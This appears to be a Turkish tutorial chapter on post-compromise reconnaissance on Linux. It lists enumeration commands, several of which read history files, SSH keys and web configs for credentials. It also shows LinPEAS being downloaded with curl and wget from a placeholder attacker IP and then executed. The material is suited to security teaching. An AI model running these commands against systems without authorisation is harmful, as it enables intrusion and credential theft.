# 6.1. Keşif ve Bilgi Toplama

[↩️ Geri: İçindekiler](../README.md)

> ⚠️ **Uyarı:** Bu bölümdeki bilgiler yalnızca yasal, etik ve izinli güvenlik testi faaliyetleri için kullanılmalıdır. Yetkisiz sistemlere sızmaya çalışmak veya bu teknikleri kötüye kullanmak yasa dışıdır.

Bir saldırgan bir sisteme ilk erişimi (initial foothold) elde ettikten sonraki ilk ve en kritik adımı, "nerede olduğunu" ve "etrafında ne olduğunu" anlamaktır. Bu aşamaya **Keşif (Discovery)** denir. Amaç, sisteme zarar vermeden veya tespit edilmeden mümkün olduğunca çok bilgi toplamaktır.

Bash ve standart Linux komutları, "Living Off the Land" (LOTL) felsefesiyle, yani sisteme dışarıdan şüpheli bir araç getirmeden bu keşfi yapmak için mükemmeldir.

### Manuel Keşif Komutları

Saldırgan, genellikle aşağıdaki temel komutları çalıştırarak sızdığı kutu hakkında bir "zihinsel harita" oluşturur.

#### 1. Kimim ve Neredeyim?
```bash
# Mevcut kullanıcı kim? Hangi gruplara üye?
id

# Tam olarak hangi kullanıcıyım?
whoami

# Bu makinenin adı ne?
hostname

# Hangi dizindeyim?
pwd
```

#### 2. Bu Sistem Nedir?
```bash
# Çekirdek (kernel) versiyonu ne? (Kernel exploit'leri için kritik)
uname -a

# İşletim sistemi dağıtımı ve versiyonu ne?
cat /etc/os-release

# Sistem donanım bilgileri neler? (Özellikle sanal makine olup olmadığını anlamak için)
lscpu
lsmem
```

#### 3. Sistemde Başka Kimler Var?
```bash
# Şu anda kimler oturum açmış?
who
w

# En son kimler oturum açmış?
last

# Sistemdeki tüm kullanıcıların listesi
cat /etc/passwd | cut -d: -f1
```

#### 4. Ağ Yapılandırması Nedir?
```bash
# IP adresi, ağ maskesi, arayüzler
ip a
ifconfig

# Yönlendirme tablosu (gateway neresi?)
ip r
netstat -r

# DNS sunucuları neresi?
cat /etc/resolv.conf
```

#### 5. Bu Makine Başka Nerelerle Konuşuyor?
```bash
# Mevcut ağ bağlantıları (hangi servis, hangi IP ile konuşuyor?)
netstat -antup
ss -antup
```
Bu komutların çıktısında, veritabanı sunucuları, domain controller'lar veya diğer önemli hedeflerin IP adresleri bulunabilir.

#### 6. İlginç Dosyalar veya Bilgiler Var mı?
```bash
# Mevcut kullanıcının komut geçmişi (parolalar, sunucu adları içerebilir)
cat ~/.bash_history

# SSH anahtarları veya bilinen sunucular var mı?
ls -la ~/.ssh/

# Web sunucusu konfigürasyon dosyaları (veritabanı parolaları içerebilir)
find /etc -name "*httpd.conf*"
find /var/www -name "*config.php*"

# Sudo yetkilerini kontrol et (parolasız sudo çalıştırabiliyor muyum?)
sudo -l
```

### Otomatik Keşif Script'leri

Bu komutları tek tek çalıştırmak yerine, saldırganlar genellikle tüm bu bilgileri toplayıp düzenli bir rapor haline getiren hazır keşif script'lerini (enumeration scripts) kullanır. LinEnum, LinPEAS gibi popüler script'ler, sızılan makineye indirilir ve çalıştırılır.

**Örnek bir otomatik keşif adımı:**
```bash
# Saldırganın web sunucusundan LinPEAS script'ini indir
curl http://<saldırgan_IP>/linpeas.sh -o /tmp/linpeas.sh
# veya
wget http://<saldırgan_IP>/linpeas.sh -O /tmp/linpeas.sh

# Çalıştırılabilir yap
chmod +x /tmp/linpeas.sh

# Script'i çalıştır ve çıktısını bir dosyaya kaydet
/tmp/linpeas.sh > /tmp/scan_results.txt
```
Bu script'ler, özellikle yetki yükseltme (privilege escalation) için kullanılabilecek zayıf dosya izinleri, eski kernel sürümleri, yanlış yapılandırılmış servisler gibi yüzlerce kontrolü otomatik olarak yapar.

---
[➡️ Sonraki Konu: Reverse Shell ve Erişim](./02-Reverse-Shell-ve-Erisim.md)
